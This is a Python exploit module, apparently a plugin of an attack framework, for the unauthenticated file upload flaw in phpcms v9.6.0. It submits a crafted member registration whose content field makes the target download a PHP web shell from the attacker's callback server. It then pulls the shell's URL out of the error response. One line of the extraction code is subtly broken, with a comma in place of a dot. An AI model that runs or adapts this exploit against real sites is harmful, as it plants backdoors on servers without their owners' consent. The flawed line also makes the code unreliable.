#!/usr/bin/env python
# -*- coding: utf-8 -*-

# author: zhangxf55
# phpcms v9.6.0 php file upload without login
# see: https://www.freebuf.com/vuls/131648.html
# see: https://www.cnblogs.com/sqyysec/p/6725870.html

import sys
sys.path.append('../..')
from modules.request.req import *
from configuration import configuration as config
from models.payload import Payload, PayloadFailException
from utils import Utils

class PHPCMS(Payload):
    def attack(self):
        url = "http://%s/index.php?m=member&c=index&a=register&siteid=1" % self.host
        print(url)
        login_pass = Utils.randmd5()
        callback_shell_url = "http://%s:%d/" % (config.ccServer['address'], config.ccServer['port'])
        data = {
            "modelid": 10,
            "username": Utils.randmd5(),
            "password": login_pass,
            "pwdconfirm": login_pass,
            "email": Utils.randmd5() + "@qq.com",
            "nickname": "nick"+Utils.randmd5()[0:8],
            "info[content]": '<img src="%s?.php#.jpg" />' % callback_shell_url,
            "dosubmit": "1",
            "protocol": ""
        }
        print(data)
        try:
            resp = post(url=url, data=data)
            print(resp.text)
            if 200 == resp.status_code and "MySQL Error" in resp.text and "http" in resp.text:
                successUrl = resp.text[resp.text.index("http"):resp.text,index(".php")] + ".php"
                return successUrl, Utils.getPassword(self.host)
            else:
                raise PayloadFailException('Payload no echo message for %s' % self.host)
        except:
            raise PayloadFailException('Payload failed for %s' % self.host)
